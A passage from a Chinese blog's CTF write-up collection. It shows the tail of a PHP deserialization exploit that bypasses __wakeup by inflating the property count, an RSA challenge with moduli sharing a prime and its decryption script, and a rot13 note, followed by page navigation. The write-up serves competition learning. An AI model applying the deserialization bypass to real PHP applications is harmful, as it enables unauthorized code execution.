class="string">&#x27;/(&quot;Fun&quot;:2:)/&#x27;</span>,<span class="string">&#x27;&quot;Fun&quot;:3:&#x27;</span>,<span class="variable">$mu</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$mu</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>对于wakeup中有die的Fun类，构造序列化字符串中描述属性数量大于实际数量绕过wakeup，其中func属性可控，在call_user_func中调用Test类中的getFlag方法，获取flag</p>
<h2 id="crypto-2"><a href="#crypto-2" class="headerlink" title="crypto"></a>crypto</h2><h3 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h3><!-- 这波真是简单题，国赛华中赛区遇到过的共模攻击，一下没反应过来，还是见识少了 -->
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">a = f.readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    n = <span class="built_in">int</span>(i)</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    m = c</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;c = %s&#x27;</span> % (m)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = 38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>确认所有n的两两公因数都相同后写脚本直接出</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">a = f.readlines()</span><br><span class="line">p_all = gcd(<span class="built_in">int</span>(a[<span class="number">1</span>]),<span class="built_in">int</span>(a[<span class="number">2</span>]))</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">no = <span class="built_in">len</span>(a)</span><br><span class="line">m = <span class="number">38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    n = <span class="built_in">int</span>(a[no-i-<span class="number">1</span>])</span><br><span class="line">    q = n//p_all</span><br><span class="line">    d = gmpy2.invert(e,(p_all-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    m = <span class="built_in">pow</span>(m,d,n)</span><br><span class="line">r = binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]).decode()</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>

<h2 id="misc-3"><a href="#misc-3" class="headerlink" title="misc"></a>misc</h2><h3 id="签个到"><a href="#签个到" class="headerlink" title="签个到"></a>签个到</h3><p>rot13加在线解密</p>

      <div class="tags">
          <a href="/tags/writeup/" rel="tag"><i class="ic i-tag"></i> writeup</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">Edited on</span>
    <time title="Modified: 2023-03-08 19:49:04" itemprop="dateModified" datetime="2023-03-08T19:49:04+08:00">2023-03-08</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> Donate</button>
  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="muhua WeChat Pay">
        <p>WeChat Pay</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="muhua Alipay">
        <p>Alipay</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt="muhua PayPal">
        <p>PayPal</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>Post author:  </strong>muhua <i class="ic i-at"><em>@</em></i>暮间的花园
  </li>
  <li class="link">
    <strong>Post link: </strong>
    <a href="http://example.com/2023/02/20/check_in_wp(3)/" title="2022年的一些比赛部分题解">http://example.com/2023/02/20/check_in_wp(3)/</a>
  </li>
  <li class="license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2022/05/25/redis%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giph4fomxoj20zk0m8axp.jpg" title="redis环境搭建">
  <span class="type">Previous Post</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>redis环境搭建</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2023/03/05/java%E5%8F%8D%E5%B0%84%E6%B5%85%E5%AD%A6/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclimtf7dj20zk0m8qav.jpg" title="java反射浅学">
  <span class="type">Next Post</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>java反射浅学</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="Contents">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#bytectf"><span class="toc-number">1.</span> <span class="toc-text">bytectf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#double-sqli"><span class="toc-number">1.1.1.</span> <span class="toc-text">double sqli</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%9F%E6%80%81"><span class="toc-number">1.2.</span> <span class="toc-text">拟态</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#zerocalc"><span class="toc-number">1.2.1.</span> <span class="toc-text">zerocalc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#esayfilter"><span class="toc-number">1.2.2.</span> <span class="toc-text">esayfilter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jack-Shiro"><span class="toc-number">1.2.3.</span> <span class="toc-text">Jack-Shiro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Give-me-your-0day"><span class="toc-number">1.2.4.</span> <span class="toc-text">Give_me_your_0day</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#newhospital"><span class="toc-number">1.2.5.</span> <span class="toc-text">newhospital</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezpickle"><span class="toc-number">1.2.6.</span> <span class="toc-text">ezpickle</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%AD%94%E6%B3%95%E4%B8%96%E7%95%8C"><span class="toc-number">2.</span> <span class="toc-text">魔法世界</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">2.1.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WELCOME-DASCTFxJlenu"><span class="toc-number">2.1.1.</span> <span class="toc-text">WELCOME DASCTFxJlenu</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%B7%E8%B7%AF%E7%9A%84%E9%AD%94%E6%B3%95%E5%B0%91%E5%A5%B3"><span class="toc-number">2.1.2.</span> <span class="toc-text">迷路的魔法少女</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#geek2021"><span class="toc-number">3.</span> <span class="toc-text">geek2021</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#babysql"><span class="toc-number">3.1.</span> <span class="toc-text">babysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyPOP"><span class="toc-number">3.2.</span> <span class="toc-text">babyPOP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#where-is-my-FUMO"><span class="toc-number">3.3.</span> <span class="toc-text">where_is_my_FUMO</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babypy"><span class="toc-number">3.4.</span> <span class="toc-text">babypy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Baby-PHP-Black-Magic-Enlightenment"><span class="toc-number">3.5.</span> <span class="toc-text">Baby_PHP_Black_Magic_Enlightenment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%9C%9C%E9%9B%AA%E5%86%B0%E5%9F%8E%E7%94%9C%E8%9C%9C%E8%9C%9C"><span class="toc-number">3.6.</span> <span class="toc-text">蜜雪冰城甜蜜蜜</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB"><span class="toc-number">4.</span> <span class="toc-text">陇原战疫</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#eaaasyphp"><span class="toc-number">4.1.</span> <span class="toc-text">eaaasyphp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2021L3HCTF"><span class="toc-number">5.</span> <span class="toc-text">2021L3HCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#EasyPHP"><span class="toc-number">5.1.</span> <span class="toc-text">EasyPHP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A5%BF%E6%B9%96%E8%AE%BA%E4%B8%8D%E6%87%82%E5%89%91"><span class="toc-number">6.</span> <span class="toc-text">西湖论不懂剑</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%81%8F%E5%A6%B9%E7%9A%84web"><span class="toc-number">6.1.</span> <span class="toc-text">灏妹的web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezupload"><span class="toc-number">6.2.</span> <span class="toc-text">ezupload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OA-RCE"><span class="toc-number">6.3.</span> <span class="toc-text">OA?RCE?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EasyTp"><span class="toc-number">6.4.</span> <span class="toc-text">EasyTp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#N1ctf"><span class="toc-number">7.</span> <span class="toc-text">N1ctf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Signin"><span class="toc-number">7.1.</span> <span class="toc-text">Signin</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B9%96%E6%B9%98%E6%9D%AF"><span class="toc-number">8.</span> <span class="toc-text">湖湘杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web2"><span class="toc-number">8.1.</span> <span class="toc-text">web2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hgame"><span class="toc-number">9.</span> <span class="toc-text">hgame</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%9B%9B%E8%9B%9B%E2%80%A6%E5%98%BF%E5%98%BF%E2%99%A5%E6%88%91%E7%9A%84%E8%9B%9B%E8%9B%9B"><span class="toc-number">9.1.</span> <span class="toc-text">蛛蛛…嘿嘿♥我的蛛蛛</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tetris-plus"><span class="toc-number">9.2.</span> <span class="toc-text">Tetris plus</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hufu"><span class="toc-number">10.</span> <span class="toc-text">hufu</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezphp"><span class="toc-number">10.0.1.</span> <span class="toc-text">ezphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babysql-1"><span class="toc-number">10.0.2.</span> <span class="toc-text">babysql</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hmg2021"><span class="toc-number">11.</span> <span class="toc-text">hmg2021</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Smarty-calculator"><span class="toc-number">11.0.1.</span> <span class="toc-text">Smarty_calculator</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2022das%E4%B8%89%E6%9C%88%E8%B5%9B"><span class="toc-number">12.</span> <span class="toc-text">2022das三月赛</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezpop"><span class="toc-number">12.0.1.</span> <span class="toc-text">ezpop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#updgstore"><span class="toc-number">12.0.2.</span> <span class="toc-text">updgstore</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#calc"><span class="toc-number">12.0.3.</span> <span class="toc-text">calc</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF"><span class="toc-number">13.</span> <span class="toc-text">ctfshow愚人杯</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#starctf"><span class="toc-number">14.</span> <span class="toc-text">starctf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#oh-my-grafana"><span class="toc-number">14.1.</span> <span class="toc-text">oh-my-grafana</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#oh-my-notepro"><span class="toc-number">14.2.</span> <span class="toc-text">oh-my-notepro</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyrsa"><span class="toc-number">14.3.</span> <span class="toc-text">easyrsa</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#dasctf2022-%E6%8A%97%E2%80%99%E7%96%AB%E2%80%99"><span class="toc-number">15.</span> <span class="toc-text">dasctf2022 抗’疫’</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web1"><span class="toc-number">15.1.</span> <span class="toc-text">web1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-real"><span class="toc-number">15.2.</span> <span class="toc-text">easy_real</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ISCC2022"><span class="toc-number">16.</span> <span class="toc-text">ISCC2022</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-1"><span class="toc-number">16.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%AC%E5%A5%A5%E4%BC%9A"><span class="toc-number">16.1.1.</span> <span class="toc-text">冬奥会</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#findme"><span class="toc-number">16.1.2.</span> <span class="toc-text">findme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pop2022"><span class="toc-number">16.1.3.</span> <span class="toc-text">Pop2022</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-1"><span class="toc-number">16.2.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E6%9D%BF%E5%B0%8F%E5%B0%86%E8%8B%8F%E7%BF%8A%E9%B8%A3"><span class="toc-number">16.2.1.</span> <span class="toc-text">单板小将苏翊鸣</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%98%A5%E7%A7%8B%E6%9D%AF2022-5%E5%AD%A3%E8%B5%9B"><span class="toc-number">17.</span> <span class="toc-text">春秋杯2022.5季赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Mercy-code"><span class="toc-number">17.1.</span> <span class="toc-text">Mercy-code</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwnhub"><span class="toc-number">18.</span> <span class="toc-text">pwnhub</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-2"><span class="toc-number">18.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplatePlay"><span class="toc-number">18.1.1.</span> <span class="toc-text">TemplatePlay</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MyNotes"><span class="toc-number">18.1.2.</span> <span class="toc-text">MyNotes</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwnhub%E5%86%85%E9%83%A8%E8%B5%9B%E4%BA%94%E6%9C%88"><span class="toc-number">19.</span> <span class="toc-text">pwnhub内部赛五月</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-3"><span class="toc-number">19.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MockingMail"><span class="toc-number">19.1.1.</span> <span class="toc-text">MockingMail</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%95%E8%BA%AB%E6%9D%AF-ctfshow"><span class="toc-number">20.</span> <span class="toc-text">_单身杯 ctfshow</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT"><span class="toc-number">20.1.</span> <span class="toc-text">OSINT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%80%A7%E8%80%81%E6%9D%BF"><span class="toc-number">20.1.1.</span> <span class="toc-text">任性老板</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-number">20.2.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Dancing-Men"><span class="toc-number">20.2.1.</span> <span class="toc-text">The Dancing Men</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2022DASCTF-MAY-%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B"><span class="toc-number">21.</span> <span class="toc-text">2022DASCTF MAY 出题人挑战赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-4"><span class="toc-number">21.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Power-Cookie"><span class="toc-number">21.1.1.</span> <span class="toc-text">Power Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AD%94%E6%B3%95%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-number">21.1.2.</span> <span class="toc-text">魔法浏览器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getme"><span class="toc-number">21.1.3.</span> <span class="toc-text">getme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hackme"><span class="toc-number">21.1.4.</span> <span class="toc-text">hackme</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B"><span class="toc-number">22.</span> <span class="toc-text">Dest0g3 520迎新赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-5"><span class="toc-number">22.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phpdest"><span class="toc-number">22.1.1.</span> <span class="toc-text">phpdest</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EasyPHP-1"><span class="toc-number">22.1.2.</span> <span class="toc-text">EasyPHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimpleRCE"><span class="toc-number">22.1.3.</span> <span class="toc-text">SimpleRCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#funny-upload"><span class="toc-number">22.1.4.</span> <span class="toc-text">funny_upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pharpop"><span class="toc-number">22.1.5.</span> <span class="toc-text">pharpop</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO-1"><span class="toc-number">22.2.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#babyRSA"><span class="toc-number">22.2.1.</span> <span class="toc-text">babyRSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyAES"><span class="toc-number">22.2.2.</span> <span class="toc-text">babyAES</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">22.3.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pngenius"><span class="toc-number">22.3.1.</span> <span class="toc-text">Pngenius</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E5%8F%B6%E8%8D%89%E5%B0%8F%E6%B4%BB%E5%8A%A8"><span class="toc-number">23.</span> <span class="toc-text">四叶草小活动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-2"><span class="toc-number">23.1.</span> <span class="toc-text">misc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF2022"><span class="toc-number">24.</span> <span class="toc-text">强网杯2022</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-6"><span class="toc-number">24.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#babyweb"><span class="toc-number">24.1.1.</span> <span class="toc-text">babyweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezweb"><span class="toc-number">24.1.2.</span> <span class="toc-text">ezweb</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B"><span class="toc-number">24.2.</span> <span class="toc-text">强网先锋</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rcefile"><span class="toc-number">24.2.1.</span> <span class="toc-text">rcefile</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2"><span class="toc-number">25.</span> <span class="toc-text">巅峰极客</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-7"><span class="toc-number">25.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#babyweb-1"><span class="toc-number">25.1.1.</span> <span class="toc-text">babyweb</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">25.2.</span> <span class="toc-text">crypto</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn"><span class="toc-number">26.</span> <span class="toc-text">ciscn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-8"><span class="toc-number">26.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-so-easy-4-u"><span class="toc-number">26.1.1.</span> <span class="toc-text">web_so_easy_4_u</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2022wdb"><span class="toc-number">27.</span> <span class="toc-text">2022wdb</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto-1"><span class="toc-number">27.1.</span> <span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#091"><span class="toc-number">27.1.1.</span> <span class="toc-text">091</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#92"><span class="toc-number">27.1.2.</span> <span class="toc-text">92</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">27.2.</span> <span class="toc-text">WEB</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF2022"><span class="toc-number">28.</span> <span class="toc-text">羊城杯2022</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-9"><span class="toc-number">28.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-rce-me"><span class="toc-number">28.1.1.</span> <span class="toc-text">1-1 rce_me</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-6"><span class="toc-number">28.2.</span> <span class="toc-text">1-6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto-2"><span class="toc-number">28.3.</span> <span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezrsa"><span class="toc-number">28.3.1.</span> <span class="toc-text">ezrsa</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-3"><span class="toc-number">28.4.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E4%B8%AA%E5%88%B0"><span class="toc-number">28.4.1.</span> <span class="toc-text">签个到</span></a></li></ol></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="Related">
      </div>
      <div class="overview panel" data-title="Overview">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="muhua"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">muhua</p>
  <div class="description" itemprop="description"></div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">13</span>
        <span class="name">posts</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">5</span>
        <span class="name">tags</span>
      </a>
    </div>
</nav>

<div class="social">
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2022/05/25/redis%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2023/03/05/java%E5%8F%8D%E5%B0%84%E6%B5%85%E5%AD%A6/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>Random Posts</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2021/09/28/(2)check_in_wp/" title="2021下半年的一些比赛部分题解">2021下半年的一些比赛部分题解</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/05/12/buu%E8%AE%B0%E5%BD%95(2)/" title="buu记录(2)">buu记录(2)</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/03/05/java%E5%8F%8D%E5%B0%84%E6%B5%85%E5%AD%A6/" title="java反射浅学">java反射浅学</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2020/12/14/%E5%AD%A6%E4%B9%A0ctf%E7%9A%84%E4%BD%93%E9%AA%8C%E4%B8%8E%E5%BF%83%E5%BE%97/" title="学习ctf的体验与心得">学习ctf的体验与心得</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

